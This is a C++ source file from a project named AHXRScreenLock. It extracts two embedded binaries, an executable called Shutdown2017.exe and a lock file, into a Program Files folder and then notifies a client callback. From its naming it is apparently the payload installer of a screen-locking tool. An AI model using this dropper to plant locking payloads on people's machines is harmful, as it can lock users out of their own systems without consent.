/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include								"stdafx.h"
#include								"payload_install.h"
#include								"install_callback.h"
#include								"resource1.h"

#include								<ShlObj.h>
#include								<fstream>

using namespace							std;

HANDLE									h_install_thread;
DWORD									dw_install_thread;
DWORD WINAPI							t_install(LPVOID lpParam);

void									installShutdown2017(const char * path);

DWORD WINAPI t_install(LPVOID lpParam) {
	puts(getInstallPath().c_str());
	installShutdown2017(getInstallPath().c_str());
	return 0;
}

string getInstallPath() {
	TCHAR
		t_program_files[MAX_PATH]
		;
	string s_full_path;

	SHGetSpecialFolderPath(0, t_program_files, CSIDL_PROGRAM_FILES, FALSE);
	s_full_path = t_program_files + string("\\") + string(SHUTDOWN_FOLDER_NAME);
	return s_full_path;
}

void installShutdown2017( const char * path ) {
	printf("Attempting to install Shutdown 2017 in \"%s\" \r\n", path);
	if (CreateDirectory( path, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {

		// Installing Shutdown2017.exe
		HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA3), RT_RCDATA);
		unsigned int i_resource = ::SizeofResource(NULL, hRes);
		LPVOID lpRes = LoadResource(NULL, hRes);
		void * pResourceLock = LockResource(lpRes);

		std::string s_extract;
		s_extract = path + string("\\");
		s_extract += SHUTDOWN_FILE_NAME;

	//	puts(s_extract.c_str());

		fstream f_shutdown;
		f_shutdown.open(s_extract, ios::out | ios::binary);
		f_shutdown.write((char*)pResourceLock, i_resource);
		f_shutdown.close();

		// Adding shutdownlock
		s_extract = path + string("\\");
		s_extract += LOCKED_FILE_NAME;

		hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA4), RT_RCDATA);
		i_resource = ::SizeofResource(NULL, hRes);
		lpRes = LoadResource(NULL, hRes);
		pResourceLock = LockResource(lpRes);

		fstream f_write(s_extract, ios::out | ios::binary);
		f_write.write((char*)pResourceLock, i_resource);
		f_write.close();

		onClientInstallShutdown( path );
	}
	else
		puts("Couldn't install.");
}